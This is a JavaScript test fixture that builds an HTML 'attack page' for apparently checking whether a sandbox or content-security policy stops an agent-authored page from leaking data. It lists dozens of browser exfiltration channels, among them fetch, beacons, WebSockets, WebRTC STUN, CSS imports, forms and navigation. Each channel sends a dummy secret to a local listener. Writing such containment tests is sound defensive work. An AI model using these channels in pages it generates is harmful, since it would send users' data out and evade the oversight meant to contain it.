// An agent-authored page that tries every way out the audit and the CSP list know of. Every probe carries the secret,
// so anything reaching the listener is an exfiltration. `port` is a listener the driver runs (TCP+UDP).
export const secret = "S3CR3T"

export function attackPage(port) {
  const u = (name) => `http://127.0.0.1:${port}/${name}?d=${secret}`
  return `<h2 id="status">attack page</h2>
<form id="f" action="${u("form-action")}" method="get"><input name="d" value="${secret}"><button id="fb">go</button></form>
<a id="blank" href="${u("a-target-blank")}" target="_blank">blank</a>
<a id="link" href="${u("a-click")}">link</a>
<style>@import url("${u("css-import")}");body{background:url("${u("css-bg")}")}@font-face{font-family:x;src:url("${u("css-font")}")}</style>
<link rel="stylesheet" href="${u("link-css")}">
<link rel="preconnect" href="http://127.0.0.1:${port}">
<link rel="dns-prefetch" href="http://127.0.0.1:${port}">
<link rel="prefetch" href="${u("link-prefetch")}">
<img src="${u("img-tag")}" width="1" height="1">
<script src="${u("script-src")}"></script>
<iframe src="${u("iframe-src")}" width="1" height="1"></iframe>
<object data="${u("object-data")}"></object>
<script>
var t=function(f){try{var r=f();if(r&&r.catch)r.catch(function(){})}catch(e){}};
t(function(){return fetch("${u("fetch")}",{mode:"no-cors"})});
t(function(){var x=new XMLHttpRequest();x.open("GET","${u("xhr")}");x.send()});
t(function(){new Image().src="${u("img-new")}"});
t(function(){navigator.sendBeacon("${u("beacon")}","x")});
t(function(){new WebSocket("ws://127.0.0.1:${port}/ws?d=${secret}")});
t(function(){new EventSource("${u("eventsource")}")});
t(function(){new Worker("${u("worker")}")});
t(function(){new Worker(URL.createObjectURL(new Blob(["fetch('${u("blob-worker")}',{mode:'no-cors'})"])))});
t(function(){var l=document.createElement("link");l.rel="preconnect";l.href="http://127.0.0.1:${port}";document.head.append(l)});
t(function(){var p=new RTCPeerConnection({iceServers:[{urls:"stun:127.0.0.1:${port}"}]});p.createDataChannel("x");p.createOffer().then(function(o){return p.setLocalDescription(o)})});
t(function(){window.open("${u("window-open")}")});
t(function(){window.open("${u("window-open-blank")}","_blank")});
t(function(){document.getElementById("blank").click()});
t(function(){document.getElementById("link").click()});
t(function(){document.getElementById("f").submit()});
t(function(){document.getElementById("fb").click()});
t(function(){top.location="${u("top-location")}"});
t(function(){parent.location="${u("parent-location")}"});
t(function(){var m=document.createElement("meta");m.httpEquiv="refresh";m.content="0;url=${u("meta-refresh")}";document.head.append(m)});
t(function(){var id=(/id="(vr\\d+)"/.exec(document.scripts[0].textContent)||[])[1];window.focus();document.documentElement.focus();document.body.tabIndex=0;document.body.focus();var n=0;var i=setInterval(function(){window.focus();parent.postMessage({vr:id,type:"open",url:"${u("open-message")}"},"*");parent.postMessage({vr:"vr1",type:"open",url:"${u("open-message")}"},"*");if(++n>25)clearInterval(i)},200)});
setTimeout(function(){t(function(){location.href="${u("location-href")}"})},300);
setTimeout(function(){t(function(){location.assign("${u("location-assign")}")})},600);
setTimeout(function(){t(function(){location.replace("${u("location-replace")}")})},900);
setTimeout(function(){t(function(){navigation.navigate("${u("navigation-navigate")}")})},1200);
document.getElementById("status").textContent="attack page ran";
document.body.dataset.ran="1";
</script>`
}
